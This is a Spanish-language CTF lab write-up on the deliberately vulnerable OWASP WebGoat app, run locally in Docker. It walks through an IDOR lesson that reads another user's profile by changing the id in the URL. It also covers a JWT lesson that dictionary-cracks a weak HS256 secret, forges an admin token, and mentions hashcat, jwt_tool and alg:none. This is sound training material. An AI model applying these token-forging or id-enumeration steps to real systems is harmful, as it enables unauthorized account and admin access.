# CTF2 · OWASP WebGoat

App OWASP de **lecciones guiadas**, un paso por encima de Juice Shop. En CTF2 atacamos lo que allí
quedó ligero: **JWT** (a fondo) y **control de acceso / IDOR**. Todo sobre una **instancia real**.

## Montaje

```bash
docker run -d --name webgoat -p 8088:8080 -p 9091:9090 webgoat/webgoat
```

!!! note "Puerto"
    WebGoat usa el **8080** por defecto; si lo tienes ocupado, mapéalo a otro (aquí `8088`).

Abre **http://localhost:8088/WebGoat**, **regístrate** (usuario de ≥6 caracteres) y verás el menú
organizado por categorías OWASP: *(A1) Control de Acceso Roto*, *(A3) Inyección*, *(A7) Fallos de
Autenticación*, etc.

## IDOR · referencia directa

Lección **(A1) → Insecure Direct Object References**. Primero te autenticas en la mini-app
(`tom` / `cat`); luego abusas de la autorización.

**Paso 1 — tu propio perfil.** El botón *View Profile* hace `GET /WebGoat/IDOR/profile`. La respuesta
**cruda** trae más de lo que pinta la pantalla:

```json
{ "role": 3, "color": "yellow", "size": "small", "name": "Tom Cat", "userId": "2342384" }
```

Los dos campos que **no** se muestran son `role` y **`userId`** — ese id es la *referencia directa*.

**Paso 2 — el perfil de otro.** Reutilizas la misma sesión y pides **otro id** en la URL:

```text
GET /WebGoat/IDOR/profile/2342384   → tu perfil (Tom Cat)
GET /WebGoat/IDOR/profile/2342388   → 200  "Well done, you found someone else's profile"
                                      {role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}
```

El servidor responde **200 a un perfil ajeno** → **IDOR** confirmado (lección completada).

<figure>
  <img src="../assets/wg-idor.jpg" alt="Lección IDOR de WebGoat">
</figure>

!!! tip "Lección"
    El id es **predecible** y el servidor **no comprueba propiedad**. Es el mismo fallo que la cesta
    de Juice Shop, pero aquí ves la **referencia directa** (`userId`) a plena vista en la URL.

## JWT · clave débil

Lección **(A7) → JWT tokens**. Un JWT es `header.payload.signature`: el payload va en **base64**
(cualquiera lo lee) y la seguridad depende **solo de la firma**. Con HS256, la firma usa un
**secreto**; si es débil, lo **crackeas** y re-firmas lo que quieras.

Demo real del ataque (HMAC auténtico, recomputando la firma sobre un diccionario):

```text
[1] Token recibido del servidor (HS256):
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidG9tIiwiYWRtaW4iOmZhbHNlfQ.j8qPCYEz...
    payload: {"user":"tom","admin":false}      <- admin=False

[2] Crackeo por diccionario (recomputar HMAC y comparar la firma):
    '123456' -> no   'password' -> no   'admin' -> no
    'secret' -> FIRMA COINCIDE  ** secreto encontrado **

[3] Token FORJADO (admin=True), re-firmado con el secreto crackeado:
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidG9tIiwiYWRtaW4iOnRydWV9.gIp2d5tR...
    payload: {"user":"tom","admin":true}

[4] Verificación del servidor (firma válida con el secreto): True
```

**En producción** no recomputas a mano: crackeas con **`hashcat`** / **`john`** + una wordlist
(rockyou), y re-firmas con **`jwt_tool`** o la extensión **JWT Editor** de Burp — exactamente el
[mini-lab de JWT](mini-labs.md). Variante sin crackear: **`alg:none`** (firma vacía), si el servidor
no valida el algoritmo.

<figure>
  <img src="../assets/wg-jwt.jpg" alt="Lección JWT tokens de WebGoat">
</figure>

!!! warning "Lección"
    Un JWT es **datos firmados, no cifrados**: el payload se lee siempre. Un **secreto débil** (o
    aceptar `alg:none`) convierte la identidad en **falsificable** — te vuelves `admin` sin tocar
    ninguna contraseña.

## Mapa familia → lección

| Familia | Lección WebGoat | Técnica |
|---|---|---|
| **IDOR** | Insecure Direct Object References | cambiar el id directo en la URL |
| **JWT** | JWT tokens | crackear el secreto + re-firmar (o `alg:none`) |

WebGoat también trae **SQL Injection (advanced)** y **XSS** si quieres reforzar lo de CTF1 a mayor
dificultad.

## Limpieza

```bash
docker rm -f webgoat
```

---

**Siguiente:** [CTF3 · picoCTF (tarea)](index.md) — o vuelve a [C2 · Web](index.md).
